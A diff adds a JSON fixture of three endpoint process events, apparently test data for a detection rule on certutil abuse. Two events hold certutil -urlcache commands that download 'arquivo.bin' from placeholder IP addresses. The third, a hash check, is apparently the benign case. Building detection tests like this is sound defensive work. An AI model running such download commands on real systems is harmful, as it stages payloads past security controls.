@@ -1,0 +1,29 @@
+[
+  {
+    "Timestamp": "2026-01-01T10:05:00Z",
+    "DeviceName": "host-01",
+    "AccountName": "ana",
+    "FileName": "certutil.exe",
+    "ProcessCommandLine": "certutil.exe -urlcache -f https://192.0.2.10/arquivo.bin arquivo.bin",
+    "InitiatingProcessFileName": "explorer.exe",
+    "ReportId": 1
+  },
+  {
+    "Timestamp": "2026-01-01T10:05:00Z",
+    "DeviceName": "host-01",
+    "AccountName": "ana",
+    "FileName": "CERTUTIL.EXE",
+    "ProcessCommandLine": "certutil.exe -URLCACHE -split http://198.51.100.10/arquivo.bin arquivo.bin",
+    "InitiatingProcessFileName": "explorer.exe",
+    "ReportId": 2
+  },
+  {
+    "Timestamp": "2026-01-01T10:05:00Z",
+    "DeviceName": "host-01",
+    "AccountName": "ana",
+    "FileName": "certutil.exe",
+    "ProcessCommandLine": "certutil.exe -hashfile arquivo.zip SHA256",
+    "InitiatingProcessFileName": "explorer.exe",
+    "ReportId": 100
+  }
+]
